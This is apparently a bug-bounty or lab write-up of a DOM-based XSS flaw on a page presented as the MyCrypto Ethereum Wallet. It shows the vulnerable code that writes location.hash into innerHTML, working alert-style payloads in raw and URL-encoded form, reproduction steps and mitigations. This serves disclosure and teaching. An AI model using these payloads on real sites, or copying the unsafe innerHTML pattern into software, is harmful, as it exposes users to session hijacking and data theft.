# DOM-Based Cross-Site Scripting (XSS) - MyCrypto Ethereum Wallet

## Summary

I identified a DOM-Based Cross-Site Scripting (XSS) vulnerability in the MyCrypto Ethereum Wallet application.

The application reads the URL fragment (hash) using `window.location.hash` and inserts it directly into the HTML using `innerHTML` without any sanitization or output encoding. Since browsers never encode angle brackets (`<>`) in URL fragments, an attacker can inject arbitrary HTML and JavaScript directly through the URL hash.

An attacker can craft a malicious URL and trick a victim into clicking it. Once the victim visits the page, the injected JavaScript executes in the context of the vulnerable application, triggering an `alert(1)` popup.

## Vulnerability Type

**Cross-Site Scripting (XSS) - DOM-Based (Hash Fragment Injection)**

## Vulnerable Parameter

```text
URL Fragment (Hash)
```

## Vulnerable URL

```text
https://kzlabs.in/66.php#dashboard<img src= onerror=alert(1)>
```

## Steps to Reproduce

1. Open the vulnerable page.

2. Replace the value of the URL fragment (hash) with the following payload:

   ```text
   #dashboard<img src= onerror=alert(1)>
   ```

3. Visit the crafted URL:

   ```text
   https://kzlabs.in/66.php#dashboard%3Cimg%20src=%20onerror=alert(1)%3E
   ```

4. Observe that the browser executes the injected payload and displays an `alert(1)` popup.

## Payload Used

```text
#dashboard<img src= onerror=alert(1)>
```

URL-encoded version:
```text
#dashboard%3Cimg%20src=%20onerror=alert(1)%3E
```

Alternative payloads:
```text
#">anil<script>alert(1)</script>
#"><img src=x onerror=prompt(1)>
```

## Proof of Concept

The vulnerability is DOM-Based, meaning the malicious payload is processed entirely on the client-side via the URL fragment.

The vulnerable JavaScript code:
```javascript
document.getElementById('conn-strip').innerHTML = location.hash;
```

The payload works by:
1. The application reads the URL fragment using `location.hash`
2. The hash value is inserted directly into the HTML via `innerHTML` without sanitization
3. Browsers never encode angle brackets (`<>`) in URL fragments, allowing raw HTML injection
4. The injected `<img>` tag with an `onerror` event handler executes when the image fails to load
5. The `alert(1)` function executes, displaying a popup

```html
<!-- Injected payload rendered in the page: -->
#dashboard<img src=" " onerror="alert(1)">
```

The source code confirms the vulnerability:
```javascript
function router() {
    // Read the raw hash (browsers never encode <> in fragments)
    var hash = window.location.hash.substring(1); // strips leading #
    document.getElementById('conn-strip').innerHTML = hash;
}
```
<img width="1836" height="1065" alt="Screenshot 2026-08-14 210115" src="https://github.com/user-attachments/assets/42447538-b289-407a-af1c-51e9e46b768d" />

<img width="1553" height="877" alt="Screenshot 2026-08-14 210951" src="https://github.com/user-attachments/assets/d200c750-93ce-4c52-83eb-aa3b6aace7ef" />

## Impact

DOM-Based XSS vulnerabilities via URL hash fragments are particularly dangerous because:

- **Client-Side Execution**: Payloads execute in the victim's browser context
- **No Server-Side Filtering**: Server-side filters don't process URL fragments
- **Bypasses WAF**: Web Application Firewalls typically don't inspect URL fragments
- **Easy to Distribute**: Attackers can craft malicious links and distribute them via email or social media
- **Hidden from Logs**: URL fragments are not typically logged by servers

An attacker can:

- Steal session cookies and hijack user accounts
- Perform actions on behalf of the authenticated user
- Deface the webpage or manipulate its content
- Redirect users to malicious websites
- Capture keystrokes or sensitive information
- Bypass case-sensitive filtering mechanisms

## Recommendation

To mitigate this vulnerability:

- **Avoid innerHTML**: Never use `innerHTML` to insert user-controlled content. Use `textContent` instead.
  ```javascript
  // Unsafe
  document.getElementById('conn-strip').innerHTML = hash;
  
  // Safe
  document.getElementById('conn-strip').textContent = hash;
  ```

- **Sanitize Input**: If HTML rendering is required, use a sanitization library like DOMPurify.
  ```javascript
  document.getElementById('conn-strip').innerHTML = DOMPurify.sanitize(hash);
  ```

- **Input Validation**: Validate and sanitize all user inputs, including URL fragments.

- **Content Security Policy (CSP)**: Implement a strict CSP that restricts inline scripts, event handlers, and unauthorized script sources.

- **Use Safe DOM APIs**: Use `createElement()` and `setAttribute()` instead of HTML string concatenation.

- **URL Fragment Encoding**: Consider URL-encoding the fragment before inserting it into the DOM.

- **Web Application Firewall (WAF)**: Configure WAF rules to inspect and block malicious URL fragments.

- **Security Headers**: Implement security headers like `X-XSS-Protection` and `X-Content-Type-Options` for additional protection.

- **Regular Security Audits**: Conduct regular assessments and code reviews to identify vulnerabilities.

---
